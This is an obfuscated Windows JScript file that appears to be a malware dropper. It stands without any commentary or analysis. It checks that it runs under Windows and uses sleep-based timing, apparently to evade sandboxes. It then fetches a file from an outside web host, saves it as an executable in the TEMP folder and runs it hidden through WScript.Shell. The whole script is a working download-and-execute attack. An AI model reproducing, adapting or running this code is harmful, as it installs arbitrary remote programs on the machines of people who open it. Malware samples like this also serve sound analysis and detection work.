var CD = false;
var XN = "CreateObject";
var L = function h() {return WScript[XN]("WScript.Shell");}(), FI = 11;
var v = "MSXML2.XMLHTTP";
var IF = 2123213;
var bK = 0;
function S(pn){L["Run"](pn, bK, bK);};
function W(){return "" + v;};
function dg(JP, W0){bK = bK * 1; return JP - W0;};
function Z(){return XN;};
/*@cc_on
  @if (@_win32 || @_win64)
    CD = true;
  @end
@*/
if (CD)
{
var hC = "";
function s(){return 22;};
var LW = 0; var x1 = 0;
function x()
{
var AB = new this["Date"]();
var C = AB["getUTCMilliseconds"]();
WScript["Sleep"](s());
var AB = new this["Date"]();
var m0 = AB["getUTCMilliseconds"]();
WScript["Sleep"](s());
var AB = new this["Date"]();
var jR = AB["getUTCMilliseconds"]();
var LW = "s0";
LW = dg(m0, C);
var x1 = "jd";
x1 = dg(jR, m0);
hC = "open";
return dg(LW, x1);
}
var tE = false;
var K = false;
for (var x0 = bK; x0 < s() * 1; x0++){if (x() != bK){
tE = true; 
x1 = "31" + 11 * LW + x1; 
K = true; 
break;
}}
function e() {return ((tE == true) && (tE == K)) ? 1 : bK;};
if (tE && e() && K){
function m() {return L["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "GAG7RfAjbwmOeg.exe";};
 sk = W();
 k = WScript[XN](sk);
 var Gm = 1;
 while (Gm){
try {
k[hC]("GET", "http://aztechnologies.co.uk/sdj3oa", false);
k["send"]();
Rh = "Sleep";
for (;;){WScript[Rh](s() * 11); if (k["readystate"] >= 2 * 2) break;};
Gm = bK;
} catch(GI){};
}
function yl(OS) {var t = (1, 2, 3, 4, 5, OS); return t;};
q = WScript[Z()]("ADODB.Stream");
sk = q;
sk[hC]();
sk["type"] = yl(1);
sk["write"](k["ResponseBody"]);
q["position"] = yl(bK);
sk["Save" + "ToFile"](m(), 2);
q["c"+"lose"]();
WH = m();
S(WH);
}
}

